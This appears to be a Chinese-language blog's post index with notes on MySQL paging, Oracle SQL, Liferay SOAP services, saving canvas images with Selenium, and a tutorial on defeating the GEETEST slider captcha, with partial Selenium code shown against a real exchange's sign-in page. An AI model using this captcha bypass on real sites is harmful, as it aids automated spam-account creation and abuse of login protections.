class="language-mysql">select * from table limit m offset n;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>limit m offset n</code> 含义是从第 n 条（不包括）数据开始取出 m 条数据，limit 后面跟的是 m 条数据，offset 后面是从第 n 条开始读取，即从 n+1 条开始读取 m 条数据</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Selenium 破解滑块验证码最新版</title>
      <link href="/2018/09/02/pythonseleniumcrackgeetest/"/>
      <url>/2018/09/02/pythonseleniumcrackgeetest/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文破解方式截止到 2018 年 9 月 2 日的 GEETEST 有效，本文不定期更新。</p></blockquote><p>有爬虫，自然就有反爬虫，就像病毒和杀毒软件一样，有攻就有防，两者彼此推进发展。为了防止爬虫自动注册，批量生成垃圾账号，几乎所有网站的注册页面都会用到验证码技术。而目前市场占有率很高的反爬技术验证码就是 GEETEST 滑动验证码，本篇博客就是介绍如何破解 GEETEST 验证码。</p><span id="more"></span><p><img src="http://wx1.sinaimg.cn/large/a6e9cb00ly1fuvm1s3u1bj21kw20xb29.jpg" alt="GEETEST 客户"></p><h2 id="需要用到的库"><a href="#需要用到的库" class="headerlink" title="需要用到的库"></a>需要用到的库</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 图像处理标准库</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token comment"># web 测试</span><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token comment"># 鼠标操作</span><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>action_chains <span class="token keyword">import</span> ActionChains<span class="token comment"># 等待时间</span><span class="token keyword">import</span> time<span class="token comment"># 产生随机数</span><span class="token keyword">import</span> random<span class="token comment"># 图片转换</span><span class="token keyword">import</span> base64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="破解步骤"><a href="#破解步骤" class="headerlink" title="破解步骤"></a>破解步骤</h2><ol><li>利用 selenium 进入滑块验证码页面。（略：会 selenium 的都知道怎么打开页面吧）</li><li><a href="#%E8%8E%B7%E5%8F%96%E8%83%8C%E6%99%AF%E5%9B%BE%E6%95%B0%E6%8D%AE">执行 JS 获取滑块背景图和完整背景图的数据。</a></li><li><a href="#%E4%BF%9D%E5%AD%98%E8%83%8C%E6%99%AF%E5%9B%BE">利用 base64 将图片数据转化为图片保存到本地。</a></li><li><a href="#%E8%AE%A1%E7%AE%97%E7%A7%BB%E5%8A%A8%E8%B7%9D%E7%A6%BB">通过图片像素对比分析获取缺口位置与滑块移动距离。</a></li><li><a href="#%E6%A8%A1%E6%8B%9F%E4%BA%BA%E5%B7%A5%E6%BB%91%E5%8A%A8">机器模拟人工滑动轨迹。</a></li></ol><blockquote><p>参考了 <a href="https://blog.csdn.net/qq_38685503/article/details/81187105">___PANDA___</a> 的文章，主要完善了下载背景图片步骤</p></blockquote><h3 id="获取背景图数据"><a href="#获取背景图数据" class="headerlink" title="获取背景图数据"></a>获取背景图数据</h3><p>为了反爬虫，GEETEST 最新版的背景图打乱了顺序：</p><p><img src="http://wx3.sinaimg.cn/large/a6e9cb00ly1fuvjf3q1gtj208o04g76j.jpg" alt="乱序图片">  <img src="http://wx2.sinaimg.cn/large/a6e9cb00ly1fuvjhc1xjxj207804g0uh.jpg" alt="正常图片"></p><p>看了 <a href="https://blog.csdn.net/qq_38685503/article/details/81187105">___PANDA___</a> 的方法，感觉很麻烦，如果网站用的图片很多的话，会需要很多时间来保存这些图片，费时费力还不一定准确。</p><p>所以想了个办法，通过 JS 代码获取背景图数据，通过 <code>get_base64_by_canvas(driver, class_name, contain_type)</code> 方法直接获取指定类名的 <code>canvas</code> 标签图片数据，绕过乱序图拼接为完整图的步骤，完美下载正常顺序的图片。</p><h3 id="保存背景图"><a href="#保存背景图" class="headerlink" title="保存背景图"></a>保存背景图</h3><p>通过 <code>save_base64img(data_str, save_name)</code> 方法将图片 base64 数据转化为图片并保存到本地</p><blockquote><p><code>save_bg()</code> 和 <code>save_full_bg()</code> 方法分别将这两步合在了一起</p></blockquote><h3 id="计算移动距离"><a href="#计算移动距离" class="headerlink" title="计算移动距离"></a>计算移动距离</h3><p><code>get_offset(full_bg_path, bg_path)</code> 方法，通过对比缺口背景图和完整背景图来判断缺口位置，从而计算出滑块需要滑动多少距离</p><h3 id="模拟人工滑动"><a href="#模拟人工滑动" class="headerlink" title="模拟人工滑动"></a>模拟人工滑动</h3><p><code>get_track(distance)</code> 方法根据移动距离生成模拟人的移动轨迹，该方法直接借鉴 <a href="https://blog.csdn.net/qq_38685503/article/details/81187105">___PANDA___</a> 的方法</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>因为可能其他地方也会用到，所以单独写了这个工具类，使用的时候 <code>import</code> 一下直接调用方法就行啦~</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> geetest<span class="token keyword">import</span> time<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriverdriver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://otcbtc.com/sign_in"</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>submit_btn <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'login-submit-btn'</span><span class="token punctuation">)</span>submit_btn<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># 上面只是打开 otcbtc 网站验证码的例子，下面是调用 geetest.py 的方法</span><span class="token comment"># 保存包含缺口的页面截图</span>bg_path <span class="token operator">=</span> geetest<span class="token punctuation">.</span>save_bg<span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token comment"># 保存完整背景图</span>full_bg_path <span class="token operator">=</span> geetest<span class="token punctuation">.</span>save_full_bg<span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token comment"># 移动距离</span>distance <span class="token operator">=</span> geetest<span class="token punctuation">.</span>get_offset<span class="token punctuation">(</span>full_bg_path<span class="token punctuation">,</span> bg_path<span class="token punctuation">)</span><span class="token comment"># 获取移动轨迹</span>track <span class="token operator">=</span> geetest<span class="token punctuation">.</span>get_track<span class="token punctuation">(</span>distance<span class="token punctuation">)</span><span class="token comment"># 滑动圆球至缺口处</span>geetest<span class="token punctuation">.</span>drag_the_ball<span class="token punctuation">(</span>driver<span class="token punctuation">,</span> track<span class="token punctuation">)</span><span class="token comment"># 到此就完成滑动验证码啦~</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>无特殊情况不需要传标签类名的参数</p></blockquote><h2 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h2><p><img src="http://wx3.sinaimg.cn/large/a6e9cb00ly1fuv2grdkftg207s07z4e9.gif" alt="效果图"></p><p>至此，可以就可以不用提前保存各种验证码图片了，全都能自动破解验证码了~</p><p>各位大神喜欢的话请给<a href="https://github.com/CrazyBunQnQ/SpiderTools">项目</a>点个星星<del>谢谢</del></p><p><img src="http://wx1.sinaimg.cn/large/a6e9cb00ly1fuxwjpwisjg209v01pgm3.gif"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 验证码 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Selenium </tag>
            
            <tag> Geetest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Selenium 保存 canvas 图片</title>
      <link href="/2018/09/01/pythonseleniumsavecanvas/"/>
      <url>/2018/09/01/pythonseleniumsavecanvas/</url>
      
        <content type="html"><![CDATA[<p>今天有个小需求，需要把 GEETEST 验证码图片保存下来，但是 GEETEST 的验证码图片在后台显示是乱序的，而我需要对比正常的图片，如图：</p><p><img src="http://wx3.sinaimg.cn/large/a6e9cb00ly1fuvjf3q1gtj208o04g76j.jpg" alt="乱序图片">  <img src="http://wx2.sinaimg.cn/large/a6e9cb00ly1fuvjhc1xjxj207804g0uh.jpg" alt="正常图片"></p><span id="more"></span><p>尝试了几个办法都不好使，网上也没有找到有效方法，最后想，既然能在页面上正常显示，那能不能直接把标签内容直接保存成图片呢？</p><p>然后 F12 大法，找到了该图片是 <code>&lt;canvas&gt;</code> 显示的，至于如何用 Python 和 Selenium 保存 canvas 为图片同样没有找到现成的方法，唯一有效的信息就是知道了 Selenium 能执行 JS 代码。</p><p>于是乎，尝试了下能否将 JS 执行结果跑出来，结果还真行~</p><p>主要代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriverdriver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 通过 toDataURL() 方法获取图片 base64 数据，并 return</span>getImgJS <span class="token operator">=</span> <span class="token string">'return document.getElementsByClassName("'</span> <span class="token operator">+</span> class_name <span class="token operator">+</span> <span class="token string">'")[0].toDataURL("image/png");'</span><span class="token comment"># 执行 JS 代码并拿到图片 base64 数据</span>bg_img <span class="token operator">=</span> driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span>getImgJS<span class="token punctuation">)</span><span class="token comment"># 去除类型，只要数据部分</span>bg_img <span class="token operator">=</span> bg_img<span class="token punctuation">[</span>bg_img<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到图片数据剩下的就好办啦~</p><p>只要将数据转化为图片保存到本地就可以了，这里用的是 base64 包</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64img_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>bg_img<span class="token punctuation">)</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'bg.png'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>img_data<span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就大功告成啦~</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Selenium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle 实用 SQL</title>
      <link href="/2018/07/22/oraclepracticalsql/"/>
      <url>/2018/07/22/oraclepracticalsql/</url>
      
        <content type="html"><![CDATA[<p>记录一些不经常用但是需要的时候很有用的查询语句，不定期更新</p><span id="more"></span><h2 id="数据库编码"><a href="#数据库编码" class="headerlink" title="数据库编码"></a>数据库编码</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> USERENV<span class="token punctuation">(</span><span class="token string">'LANGUAGE'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> NLS_DATABASE_PARAMETERS T <span class="token keyword">WHERE</span> T<span class="token punctuation">.</span>PARAMETER <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'NLS_LANGUAGE'</span><span class="token punctuation">,</span> <span class="token string">'NLS_TERRITORY'</span><span class="token punctuation">,</span> <span class="token string">'NLS_CHARACTERSET'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> NLS_DATABASE_PARAMETERS T <span class="token keyword">WHERE</span> T<span class="token punctuation">.</span>PARAMETER <span class="token operator">LIKE</span> <span class="token string">'%LANGUAGE%'</span> <span class="token operator">OR</span> T<span class="token punctuation">.</span>PARAMETER <span class="token operator">LIKE</span> <span class="token string">'%TERRI%'</span> <span class="token operator">OR</span> T<span class="token punctuation">.</span>PARAMETER <span class="token operator">LIKE</span> <span class="token string">'%CHAR%'</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'USERENV'</span><span class="token punctuation">,</span> USERENV<span class="token punctuation">(</span><span class="token string">'LANGUAGE'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> NLS_DATABASE_PARAMETERS T <span class="token keyword">WHERE</span> T<span class="token punctuation">.</span>PARAMETER <span class="token operator">=</span> <span class="token string">'NLS_CHARACTERSET'</span> <span class="token operator">OR</span> PARAMETER<span class="token operator">=</span><span class="token string">'NLS_LANGUAGE'</span> <span class="token operator">OR</span> PARAMETER <span class="token operator">=</span> <span class="token string">'NLS_NCHAR_CHARACTERSET'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="表相关"><a href="#表相关" class="headerlink" title="表相关"></a>表相关</h2><h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> TABLE_NAME<span class="token punctuation">,</span>TABLESPACE_NAME<span class="token punctuation">,</span><span class="token keyword">TEMPORARY</span> <span class="token keyword">FROM</span> USER_TABLES <span class="token keyword">WHERE</span> TABLE_NAME <span class="token operator">LIKE</span> <span class="token string">'%USER%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> COLUMN_NAME<span class="token punctuation">,</span>DATA_TYPE <span class="token punctuation">,</span>DATA_LENGTH<span class="token punctuation">,</span>DATA_PRECISION<span class="token punctuation">,</span>DATA_SCALE <span class="token keyword">FROM</span> USER_TAB_COLUMNS <span class="token punctuation">[</span><span class="token keyword">WHERE</span> TABLE_NAME<span class="token operator">=</span>表名<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如查询列名包含 <code>DEPT</code> 的表：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> T<span class="token punctuation">.</span>TABLE_NAME<span class="token punctuation">,</span> T<span class="token punctuation">.</span>COLUMN_NAME <span class="token keyword">FROM</span> USER_TAB_COLUMNS T <span class="token keyword">WHERE</span> T<span class="token punctuation">.</span>COLUMN_NAME <span class="token operator">LIKE</span> <span class="token string">'%DEPT%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查询指定值所在表和列"><a href="#查询指定值所在表和列" class="headerlink" title="查询指定值所在表和列"></a>查询指定值所在表和列</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span>  <span class="token keyword">CURSOR</span> CUR_QUERY <span class="token operator">IS</span>    <span class="token keyword">SELECT</span> TABLE_NAME<span class="token punctuation">,</span> COLUMN_NAME<span class="token punctuation">,</span> DATA_TYPE <span class="token keyword">FROM</span> USER_TAB_COLUMNS<span class="token punctuation">;</span>  SQL_HARD   VARCHAR2<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  FIND_VALUE VARCHAR2<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  DATE_FMT   VARCHAR2<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  VV         NUMBER<span class="token punctuation">;</span><span class="token keyword">BEGIN</span>  DBMS_OUTPUT<span class="token punctuation">.</span><span class="token keyword">ENABLE</span><span class="token punctuation">(</span>      BUFFER_SIZE   <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">NULL</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  FIND_VALUE :<span class="token operator">=</span> <span class="token string">'20180716'</span><span class="token punctuation">;</span>  DATE_FMT :<span class="token operator">=</span> <span class="token string">'yyyymmdd hh24:mi:ss'</span><span class="token punctuation">;</span>  SQL_HARD :<span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">FOR</span> REC1 <span class="token operator">IN</span> CUR_QUERY <span class="token keyword">LOOP</span>    <span class="token keyword">IF</span> REC1<span class="token punctuation">.</span>DATA_TYPE <span class="token operator">=</span> <span class="token string">'VARCHAR2'</span>    <span class="token keyword">THEN</span>      SQL_HARD :<span class="token operator">=</span> <span class="token string">'SELECT COUNT(*) FROM  '</span> <span class="token operator">||</span> REC1<span class="token punctuation">.</span>TABLE_NAME                  <span class="token operator">||</span> <span class="token string">' WHERE '</span>                  <span class="token operator">||</span> REC1<span class="token punctuation">.</span>COLUMN_NAME <span class="token operator">||</span> <span class="token string">' LIKE ''%'</span> <span class="token operator">||</span> FIND_VALUE <span class="token operator">||</span> <span class="token string">'%'''</span><span class="token punctuation">;</span>    ELSIF REC1<span class="token punctuation">.</span>DATA_TYPE <span class="token operator">=</span> <span class="token string">'NUMBER'</span>      <span class="token keyword">THEN</span>        SQL_HARD :<span class="token operator">=</span> <span class="token string">'SELECT COUNT(*) FROM  '</span> <span class="token operator">||</span> REC1<span class="token punctuation">.</span>TABLE_NAME                    <span class="token operator">||</span> <span class="token string">' WHERE TO_CHAR('</span>                    <span class="token operator">||</span> REC1<span class="token punctuation">.</span>COLUMN_NAME <span class="token operator">||</span> <span class="token string">') LIKE ''%'</span> <span class="token operator">||</span> FIND_VALUE <span class="token operator">||</span> <span class="token string">'%'''</span><span class="token punctuation">;</span>    ELSIF REC1<span class="token punctuation">.</span>DATA_TYPE <span class="token operator">=</span> <span class="token string">'TIMESTAMP(6)'</span> <span class="token operator">OR</span> REC1<span class="token punctuation">.</span>DATA_TYPE <span class="token operator">=</span> <span class="token string">'DATE'</span>      <span class="token keyword">THEN</span>        SQL_HARD :<span class="token operator">=</span> <span class="token string">'SELECT COUNT(*) FROM  '</span> <span class="token operator">||</span> REC1<span class="token punctuation">.</span>TABLE_NAME                    <span class="token operator">||</span> <span class="token string">' WHERE TO_CHAR('</span>                    <span class="token operator">||</span> REC1<span class="token punctuation">.</span>COLUMN_NAME <span class="token operator">||</span> <span class="token string">','''</span> <span class="token operator">||</span> DATE_FMT <span class="token operator">||</span> <span class="token string">''') LIKE ''%'</span> <span class="token operator">||</span> FIND_VALUE <span class="token operator">||</span> <span class="token string">'%'''</span><span class="token punctuation">;</span>    <span class="token comment">--     ELSE</span>    <span class="token comment">--       DBMS_OUTPUT.PUT_LINE(REC1.DATA_TYPE);</span>    <span class="token keyword">END</span> <span class="token keyword">IF</span><span class="token punctuation">;</span>    <span class="token keyword">EXECUTE</span> IMMEDIATE SQL_HARD <span class="token keyword">INTO</span> VV<span class="token punctuation">;</span>    <span class="token keyword">IF</span> VV <span class="token operator">&gt;</span> <span class="token number">0</span>    <span class="token keyword">THEN</span>      DBMS_OUTPUT<span class="token punctuation">.</span>PUT_LINE<span class="token punctuation">(</span>REC1<span class="token punctuation">.</span>DATA_TYPE <span class="token operator">||</span> <span class="token string">' 类型字段值 '''</span> <span class="token operator">||</span> FIND_VALUE <span class="token operator">||</span> <span class="token string">''' 在 '</span>                           <span class="token operator">||</span> REC1<span class="token punctuation">.</span>TABLE_NAME <span class="token operator">||</span> <span class="token string">' 表中的 '</span> <span class="token operator">||</span> REC1<span class="token punctuation">.</span>COLUMN_NAME <span class="token operator">||</span> <span class="token string">' 字段'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">END</span> <span class="token keyword">IF</span><span class="token punctuation">;</span>  <span class="token keyword">END</span> <span class="token keyword">LOOP</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>Oracle SQL Developer</code> 中 View → Dbms Output 选项显示输出内容<br><code>IntelliJ IDEA</code> 中在 <code>Database Console</code> 窗口中左上角点击 <img src="http://wx4.sinaimg.cn/large/a6e9cb00ly1fuibejxbvaj20160163yd.jpg"> 图标显示输出内容</p></blockquote><h2 id="函数用法"><a href="#函数用法" class="headerlink" title="函数用法"></a>函数用法</h2><h3 id="字符串长度——LENGTH"><a href="#字符串长度——LENGTH" class="headerlink" title="字符串长度——LENGTH"></a>字符串长度——LENGTH</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LENGTH<span class="token punctuation">(</span><span class="token string">'2018-07-0415:22:00'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="截取字符串——SUBSTR"><a href="#截取字符串——SUBSTR" class="headerlink" title="截取字符串——SUBSTR"></a>截取字符串——SUBSTR</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> SUBSTR<span class="token punctuation">(</span><span class="token string">'2018-07-0415:22:00'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="合并字符串——"><a href="#合并字符串——" class="headerlink" title="合并字符串——||"></a>合并字符串——||</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> SUBSTR<span class="token punctuation">(</span><span class="token string">'2018-07-0415:22:00'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">' '</span><span class="token operator">||</span>SUBSTR<span class="token punctuation">(</span><span class="token string">'2018-07-0415:22:00'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="字符串数字转换"><a href="#字符串数字转换" class="headerlink" title="字符串数字转换"></a>字符串数字转换</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> TO_CHAR<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'1'</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span><span class="token keyword">SELECT</span> TO_NUMBER<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Oracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liferay Web Service</title>
      <link href="/2018/07/08/liferaywebservice/"/>
      <url>/2018/07/08/liferaywebservice/</url>
      
        <content type="html"><![CDATA[<p>最近项目中需要在移动端（HTML5 页面）中调用 Liferay Portal 接口，奈何网上资料很少而且版本各异，所以就只能硬着头皮啃<a href="https://dev.liferay.com/zh/develop/tutorials/-/knowledge_base/6-2/soap-web-services">官方文档</a>了…</p><blockquote><p>这个东西都烂到没有人愿意翻译么 →_→</p></blockquote><span id="more"></span><h2 id="SOAP-WEB-SERVICES"><a href="#SOAP-WEB-SERVICES" class="headerlink" title="SOAP WEB SERVICES"></a>SOAP WEB SERVICES</h2><p>您可以通过 HTTP 通过简单对象访问协议(SOAP)访问 Liferay 的服务。打包协议是 SOAP，传输协议是 HTTP。</p><blockquote><p><strong>Note</strong>:与身份验证相关的令牌必须伴随每个 Liferay web service 调用。有关详细信息，请阅读本章前面关于服务安全层的一节。</p></blockquote><p>作为一个示例，让我们看看 Liferay 的 <code>Company</code>、<code>User</code> 和 <code>UserGroup</code> portal 服务的 SOAP web service 类，以执行以下操作:</p><ol><li>列出 User 测试所属的每个 UserGroup。</li><li>添加一个名为 MyGroup 的新 UserGroup。</li><li>将 portal 的管理用户添加到新用户组。出于演示目的，我们将使用电子邮件地址为 <code>test@liferay.com</code> 的管理用户。</li></ol><!-- 向 UserGroup 添加 User 测试。 --><p>我们将使用这些与 SOAP 相关的类:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>model<span class="token punctuation">.</span></span><span class="token class-name">CompanySoap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>model<span class="token punctuation">.</span></span><span class="token class-name">UserGroupSoap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">CompanyServiceSoap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">CompanyServiceSoapServiceLocator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">UserGroupServiceSoap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">UserGroupServiceSoapServiceLocator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">UserServiceSoap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>liferay<span class="token punctuation">.</span>portal<span class="token punctuation">.</span>service<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">UserServiceSoapServiceLocator</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>您能看到 SOAP 相关类的命名约定吗?这些类都有后缀 <code>-ServiceSoapServiceLocator</code>、<code>-ServiceSoap</code> 和<code>-Soap</code>。<code>-ServiceSoapServiceLocator</code> 类通过您提供的服务 URL 查找 <code>-ServiceSoap</code>。<code>ServiceSoap</code> 类是每个服务的 Web Service 定义语言(Web services Definition Language, WSDL)文件中指定的服务的接口。<code>Soap</code> 类是模型的可序列化实现。让我们看看如何确定这些服务的 URL。</p><p>通过打开浏览器到以下 URL ，您可以看到部署在 portal 上的服务列表:</p><p><code>http://[host]:[port]/api/axis</code>。</p><blockquote><p><strong>Note</strong>:在 Liferay 6.2 之前，有两个不同的 url 用于访问远程 Liferay 服务。<code>http://[host]:[port]/api/secure/axis</code> 用于需要验证的服务，<code>http://[host]:[port]/api/axis</code> 用于不需要验证的服务。从 Liferay 6.2 开始，所有远程 Liferay 服务都需要身份验证，使用 <code>http://[host]:[port]/api/axis</code> URL 访问它们。</p></blockquote><p>以下是 UserGroup 的安全 web 服务列表:</p><ul><li><code>Portal_UserGroupService</code> 